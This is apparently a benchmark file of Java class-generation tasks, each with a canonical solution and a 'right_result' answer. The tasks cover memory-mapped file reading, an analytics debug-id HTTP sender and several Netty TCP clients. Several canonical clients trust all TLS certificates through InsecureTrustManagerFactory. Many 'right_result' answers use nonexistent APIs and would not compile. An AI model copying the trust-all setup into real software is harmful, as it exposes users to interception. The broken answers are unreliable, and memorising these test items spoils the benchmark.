[
  {
    "Task_id": 10,
    "Instruction": "Task Description: Create a Java class that provides read-only access to file contents using MemorySegment and FileChannel for efficient memory-mapped file operations.\n\nClass Description: MemorySegmentReaderSupplier is a utility class that implements ReaderSupplier interface, designed to provide memory-mapped file reading capabilities. It uses Java NIO's FileChannel to map a file into memory as a MemorySegment, allowing efficient read operations. The class manages memory resources through an Arena and automatically handles resource cleanup.\n\nAttributes:\n- arena: Arena - Manages the lifecycle of the memory segment and ensures proper cleanup\n- memory: MemorySegment - The memory-mapped representation of the file content\n\nMethods:\n- Constructor: MemorySegmentReaderSupplier(Path path) throws IOException - Initializes the reader by opening the specified file and mapping it into memory. Throws IOException if file operations fail.\n- get: get() -> MemorySegmentReader - Returns a new MemorySegmentReader instance for accessing the memory-mapped file content\n- close: close() -> void - Releases all allocated resources by closing the arena and unmapping the memory segment",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.lang.foreign.MemorySegment;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class MemorySegmentReaderSupplier implements ReaderSupplier {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        this.arena = Arena.ofShared();\n        try (var ch = FileChannel.open(path, StandardOpenOption.READ)) {\n            this.memory = ch.map(FileChannel.MapMode.READ_ONLY, 0L, ch.size(), arena);\n        } catch (Throwable e) {\n            arena.close();\n            if (e instanceof IOException) {\n                throw (IOException) e;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(memory);\n    }\n\n    @Override\n    public void close() {\n        arena.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "import java.io.IOException;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.channels.FileChannel;\nimport jdk.incubator.foreign.Arena;\nimport jdk.incubator.foreign.MemorySegment;\nimport jdk.incubator.foreign.ReaderSupplier;\n\npublic class MemorySegmentReaderSupplier implements ReaderSupplier<MemorySegmentReader> {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        this.arena = Arena.create();\n        try (FileChannel fileChannel = FileChannel.open(path, StandardOpenOption.READ)) {\n            this.memory = MemorySegment.ofFileChannel(fileChannel, 0, fileChannel.size());\n        }\n    }\n\n    @Override\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(memory);\n    }\n\n    public void close() {\n        if (arena != null) {\n            arena.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 100,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests for sending debug information to a server, including handling redirects and SSL connections.\n\nClass Description: HttpDebugIdSender is a utility class designed to send debug information to a specified server URL using HTTP POST requests. It handles JSON payload construction, SSL connections (when needed), and follows redirects if necessary. The class includes error logging and proper resource cleanup.\n\nAttributes:\n- distinctId: String - Unique identifier for the debug session\n- infoId: String - Additional information ID to be included in the URL\n- serverUrl: String - Base URL of the server to which debug information will be sent\n\nMethods:\n- HttpDebugIdSender(String serverUrl, String distinctId, String infoId) -> None - Constructor that initializes the class with server URL, distinct ID, and info ID\n- send() -> None - Initiates the HTTP request to send debug information\n- sendHttpRequest(String serverUrl, boolean isRedirects) -> None - Internal method that handles the actual HTTP request, including connection setup, payload sending, and response handling\n- closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) -> None - Helper method to safely close all open streams and connections",
    "Canonical_solution": "import android.content.Context;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport com.sensorsdata.analytics.android.sdk.util.NetworkUtils;\nimport com.sensorsdata.analytics.android.sdk.util.TimeUtils;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpDebugIdSender {\n    private String distinctId;\n    private String infoId;\n    private String serverUrl;\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n        this.serverUrl = serverUrl;\n    }\n\n    public void send() {\n        sendHttpRequest(serverUrl, false);\n    }\n\n    private void sendHttpRequest(String serverUrl, boolean isRedirects) {\n        ByteArrayOutputStream out = null;\n        OutputStream out2 = null;\n        BufferedOutputStream bout = null;\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(String.format(serverUrl + \"&info_id=%s\", infoId));\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode URL:%s\", url), null);\n            connection = (HttpURLConnection) url.openConnection();\n            if (connection == null) {\n                SALog.info(\"HttpDebugIdSender\", String.format(\"can not connect %s,shouldn't happen\", url.toString()), null);\n                return;\n            }\n            SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n            if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                    && connection instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) connection).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n            }\n            connection.setInstanceFollowRedirects(false);\n            out = new ByteArrayOutputStream();\n            OutputStreamWriter writer = new OutputStreamWriter(out);\n            String requestBody = \"{\\\"distinct_id\\\": \\\"\" + distinctId + \"\\\"}\";\n            writer.write(requestBody);\n            writer.flush();\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode request body : %s\", requestBody), null);\n            connection.setDoOutput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-type\", \"text/plain\");\n\n            out2 = connection.getOutputStream();\n            bout = new BufferedOutputStream(out2);\n            bout.write(out.toString().getBytes(\"UTF-8\"));\n            bout.flush();\n            out.close();\n            int responseCode = connection.getResponseCode();\n            SALog.info(\"HttpDebugIdSender\", String.format(TimeUtils.SDK_LOCALE, \"DebugMode ResponseCode: %d\", responseCode), null);\n            if (!isRedirects && NetworkUtils.needRedirects(responseCode)) {\n                String location = NetworkUtils.getLocation(connection, serverUrl);\n                if (!TextUtils.isEmpty(location)) {\n                    closeStream(out, out2, bout, connection);\n                    sendHttpRequest(location, true);\n                }\n            }\n        } catch (Exception e) {\n            SALog.printStackTrace(e);\n        } finally {\n            closeStream(out, out2, bout, connection);\n        }\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        if (out != null) {\n            try {\n                out.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (out2 != null) {\n            try {\n                out2.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (bout != null) {\n            try {\n                bout.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "import java.net.*;\nimport java.io.*;\nimport java.util.logging.Logger;\n\npublic class HttpDebugIdSender {\n    private String serverUrl;\n    private String distinctId;\n    private String infoId;\n    private static final Logger logger = Logger.getLogger(HttpDebugIdSender.class.getName());\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.serverUrl = serverUrl;\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n    }\n\n    public void send() {\n        try {\n            String urlWithInfoId = serverUrl + \"?infoId=\" + infoId;\n            sendHttpRequest(urlWithInfoId, true);\n        } catch (Exception e) {\n            logger.severe(\"Error sending debug info: \" + e.getMessage());\n        }\n    }\n\n    private void sendHttpRequest(String serverUrl, boolean isRedirects) throws Exception {\n        URL url = new URL(serverUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setInstanceFollowRedirects(isRedirects);\n        connection.setRequestProperty(\"Content-Type\", \"application/json\");\n\n        String jsonPayload = String.format(\"{\\\"distinct_id\\\": \\\"%s\\\", \\\"info_id\\\": \\\"%s\\\"}\", distinctId, infoId);\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = jsonPayload.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            logger.warning(\"Received non-200 response code: \" + responseCode);\n        }\n\n        closeStream(null, null, null, connection);\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        try {\n            if (out != null) out.close();\n            if (out2 != null) out2.close();\n            if (bout != null) bout.close();\n            if (connection != null) connection.disconnect();\n        } catch (IOException e) {\n            logger.severe(\"Error closing streams: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send messages, and handle server responses.\n\nClass Description: The TelnetClient class provides functionality to connect to a remote server using TCP, with optional SSL support. It reads input from the console, sends it to the server, and handles the connection lifecycle.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the remote server (default: \"127.0.0.1\")\n- PORT: int - The port number of the remote server (default: 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Initializes and starts the TCP client. Handles the connection setup, message sending, and connection teardown. Throws Exception if any error occurs during execution.\n  Input: None\n  Output: None (void)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelInitializer; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.nio.NioSocketChannel; import io.netty.handler.codec.string.StringDecoder; import io.netty.handler.codec.string.StringEncoder; import io.netty.handler.ssl.SslContext; import io.netty.handler.ssl.SslContextBuilder; import io.netty.handler.ssl.SslHandler; import io.netty.buffer.Unpooled; import io.netty.channel.SimpleChannelInboundHandler; import java.nio.charset.StandardCharsets; import java.util.Scanner; public class TelnetClient { private boolean ssl; private String host = \"127.0.0.1\"; private int port; public TelnetClient(boolean ssl) { this.ssl = ssl; this.port = ssl ? 8992 : 8023; } public void start() throws Exception { EventLoopGroup group = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(group); bootstrap.channel(NioSocketChannel.class); ChannelPipeline pipeline = bootstrap.pipeline(); if (ssl) { SslContext sslCtx = new SslContextBuilder().forClient().build(); pipeline.addLast(new SslHandler(sslCtx)); } pipeline.addLast(new TelnetClientHandler()); ChannelFuture future = bootstrap.connect(host, port).sync(); new Thread(() -> { Scanner scanner = new Scanner(System.in); while (true) { String input = scanner.nextLine(); if (input.equalsIgnoreCase(\"exit\")) break; future.channel().writeAndFlush(Unpooled.copiedBuffer(input.getBytes())); } }).start(); future.channel().closeFuture().sync(); } finally { group.shutdownGracefully(); } } static class TelnetClientHandler extends SimpleChannelInboundHandler<ByteBuf> { @Override protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) { byte[] data = new byte[msg.readableBytes()]; msg.readBytes(data); String response = new String(data, StandardCharsets.UTF_8); System.out.println(\"Server: \" + response); } } }"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send and receive messages, and handle SSL encryption if required.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified server, optionally using SSL encryption, and includes a handler for processing incoming and outgoing messages.\n\nAttributes:\nSSL: [boolean] - Flag indicating whether SSL encryption should be used\nHOST: [String] - The host address of the server to connect to\nPORT: [int] - The port number of the server to connect to\nSIZE: [int] - The size parameter for message handling (unused in basic implementation)\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the Netty client, establishing a connection to the specified server. Handles SSL context creation if needed, configures the client pipeline, and manages connection lifecycle.\ninitChannel: [initChannel]([SocketChannel ch]) -> [void] - (Internal method) Configures the channel pipeline with SSL handler (if enabled) and custom client handler during channel initialization.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class EchoClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.TCP_NODELAY, true)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new EchoClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap; import io.netty.channel.Channel; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelInitializer; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.SocketChannel; import io.netty.channel.socket.nio.NioSocketChannel; import io.netty.handler.ssl.SslContext; import io.netty.handler.ssl.SslHandler; import io.netty.handler.codec.string.StringDecoder; import io.netty.handler.codec.string.StringEncoder; import io.netty.channel.ChannelHandlerContext; import io.netty.channel.ChannelInboundHandlerAdapter; public class EchoClient { private final boolean SSL; private final String HOST; private final int PORT; private final int SIZE; public EchoClient(boolean SSL, String HOST, int PORT, int SIZE) { this.SSL = SSL; this.HOST = HOST; this.PORT = PORT; this.SIZE = SIZE; } public void start() { EventLoopGroup group = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(group) .channel(NioSocketChannel.class) .handler(new ChannelInitializer<SocketChannel>() { @Override protected void initChannel(SocketChannel ch) { initChannel(ch); } }) .option(ChannelOption.SO_REUSEADDR, true) .option(ChannelOption.SO_TIMEOUT, 10000); ChannelFuture future = bootstrap.connect(HOST, PORT).sync(); future.channel().closeFuture().sync(); } catch (Exception e) { e.printStackTrace(); } finally { group.shutdownGracefully(); } } private void initChannel(SocketChannel ch) { ChannelPipeline pipeline = ch.pipeline(); if (SSL) { try { SslContext sslCtx = SslContext.newClientContext(); pipeline.addLast(sslCtx.newHandler(ch)); } catch (Exception e) { e.printStackTrace(); } } pipeline.addLast(new StringDecoder()); pipeline.addLast(new StringEncoder()); pipeline.addLast(new EchoClientHandler()); } private static class EchoClientHandler extends ChannelInboundHandlerAdapter { @Override public void channelActive(ChannelHandlerContext ctx) { String message = \"Hello, Server!\"; ctx.writeAndFlush(message); } @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { String received = (String) msg; System.out.println(\"Received: \" + received); ctx.writeAndFlush(received); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) { cause.printStackTrace(); ctx.close(); } } }"
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP chat client using Netty framework, capable of connecting to a remote server, sending messages from console input, and gracefully shutting down.\n\nClass Description: SimpleChatClient is a Netty-based TCP client that establishes a connection to a specified host and port, sends user input messages to the server, and handles connection lifecycle management.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nSimpleChatClient: (String host, int port) -> void - Constructor that initializes the client with target host and port\nrun: () -> void - Main method that initializes Netty components, establishes connection, handles user input, and manages shutdown\n    - Initializes NioEventLoopGroup for I/O operations\n    - Configures Bootstrap with NioSocketChannel and handler\n    - Connects to remote server and maintains channel\n    - Reads user input from console and sends to server\n    - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SimpleChatClient {\n\n    private final String host;\n    private final int port;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SimpleChatClientInitializer());\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.buffer.Unpooled;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport io.netty.handler.codec.DecoderResult;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslHandshakeCompletionEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\n\npublic class SimpleChatClient {\n    private String host;\n    private int port;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() {\n        EventLoopGroup group = new NioEventLoopGroup();\n        ChannelFuture future = null;\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new SimpleChatHandler());\n\n            future = bootstrap.connect(host, port).sync();\n\n            new Thread(() -> {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n                String input;\n                try {\n                    while ((input = reader.readLine()) != null) {\n                        if (input.equalsIgnoreCase(\"exit\")) {\n                            break;\n                        }\n                        future.channel().writeAndFlush(Unpooled.copiedBuffer(input.getBytes(StandardCharsets.UTF_8)));\n                    }\n                    future.channel().close();\n                    group.shutdownGracefully();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        if (args.length < 2) {\n            System.err.println(\"Usage: java SimpleChatClient <host> <port>\");\n            return;\n        }\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n        SimpleChatClient client = new SimpleChatClient(host, port);\n        client.run();\n    }\n}\n\npublic class SimpleChatHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n    @Override\n    public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n        if (msg instanceof byte[]) {\n            String message = new String((byte[]) msg, StandardCharsets.UTF_8);\n            System.out.println(\"Server: \" + message);\n        }\n    }\n\n    @Override\n    public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a secure (optional SSL) connection to a server, send and receive serialized Java objects.\n\nClass Description: ObjectEchoClient is a Netty-based TCP client that connects to a specified server, handles SSL encryption if enabled, and processes object serialization/deserialization for communication. The client maintains the connection until explicitly closed.\n\nAttributes:\nSSL: [boolean] - Flag indicating whether SSL encryption should be used\nHOST: [String] - The host address of the server to connect to\nPORT: [int] - The port number of the server to connect to\nSIZE: [int] - The size parameter (unused in current implementation but available for configuration)\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the Netty client, establishes connection to server, configures SSL if enabled, sets up object serialization pipeline, and maintains connection until shutdown. Throws Exception if any error occurs during startup or operation.\n\nThe method performs the following operations:\n1. Creates SSL context if SSL is enabled\n2. Initializes NioEventLoopGroup for I/O operations\n3. Configures Bootstrap with NioSocketChannel\n4. Sets up pipeline with ObjectEncoder, ObjectDecoder and custom handler\n5. Connects to specified host and port\n6. Maintains connection until channel is closed\n7. Shuts down event loop group gracefully when done",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class ObjectEchoClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                    }\n                    p.addLast(\n                            new ObjectEncoder(),\n                            new ObjectDecoder(ClassResolvers.cacheDisabled(null)),\n                            new ObjectEchoClientHandler());\n                }\n             });\n\n            b.connect(HOST, PORT).sync().channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;  \nimport io.netty.channel.Channel;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.ChannelOption;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.nio.NioSocketChannel;  \nimport io.netty.handler.codec.serialization.ObjectEncoder;  \nimport io.netty.handler.codec.serialization.ObjectDecoder;  \nimport io.netty.handler.ssl.SslContext;  \nimport io.netty.handler.ssl.SslContextBuilder;  \nimport io.netty.handler.ssl.SslHandler;  \nimport io.netty.handler.logging.LoggingHandler;  \nimport io.netty.channel.ChannelHandlerContext;  \nimport io.netty.channel.SimpleChannelInboundHandler;  \n\npublic class ObjectEchoClient {  \n    private final boolean ssl;  \n    private final String host;  \n    private final int port;  \n    private final int size;  \n\n    public ObjectEchoClient(boolean ssl, String host, int port, int size) {  \n        this.ssl = ssl;  \n        this.host = host;  \n        this.port = port;  \n        this.size = size;  \n    }  \n\n    public void start() throws Exception {  \n        SslContext sslCtx = ssl ? new SslContextBuilder().build() : null;  \n        EventLoopGroup group = new NioEventLoopGroup();  \n        try {  \n            Bootstrap bootstrap = new Bootstrap();  \n            bootstrap.group(group);  \n            bootstrap.channel(NioSocketChannel.class);  \n            bootstrap.option(ChannelOption.SO_KEEPALIVE, true);  \n            bootstrap.handler(new ChannelInitializer<Channel>() {  \n                @Override  \n                protected void initChannel(Channel ch) throws Exception {  \n                    ChannelPipeline p = ch.pipeline();  \n                    if (ssl) {  \n                        p.addLast(sslCtx.newHandler(ch));  \n                    }  \n                    p.addLast(new ObjectEncoder());  \n                    p.addLast(new ObjectDecoder());  \n                    p.addLast(new EchoHandler());  \n                }  \n            });  \n            ChannelFuture future = bootstrap.connect(host, port).sync();  \n            future.channel().closeFuture().sync();  \n        } finally {  \n            group.shutdownGracefully();  \n        }  \n    }  \n\n    private static class EchoHandler extends SimpleChannelInboundHandler<Object> {  \n        @Override  \n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {  \n            ctx.writeAndFlush(msg);  \n        }  \n\n        @Override  \n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {  \n            cause.printStackTrace();  \n            ctx.close();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an encrypted connection to a server, sends messages from standard input, and gracefully shuts down when instructed.\n\nClass Description: SecureChatClient is a Netty-based client that handles secure TCP communication with a chat server. It manages connection lifecycle, message sending, and proper resource cleanup.\n\nAttributes:\n- HOST: [String] - The server host address (default: \"127.0.0.1\")\n- PORT: [int] - The server port number (default: 8992)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network connection\n- sslCtx: [SslContext] - SSL context for secure communication\n\nMethods:\n- SecureChatClient() -> [void] - Constructor that initializes SSL context and event loop group\n- connect() -> [void] - Establishes connection to the server using Bootstrap configuration\n- startChat() -> [void] - Starts interactive chat session reading from standard input and sending messages to server\n- shutdown() -> [void] - Gracefully shuts down the client and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private SslContext sslCtx;\n\n    public SecureChatClient() throws Exception {\n        this.sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        this.group = new NioEventLoopGroup();\n    }\n\n    public void connect() throws Exception {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new SecureChatClientInitializer(sslCtx));\n\n        this.channel = b.connect(HOST, PORT).sync().channel();\n    }\n\n    public void startChat() throws Exception {\n        ChannelFuture 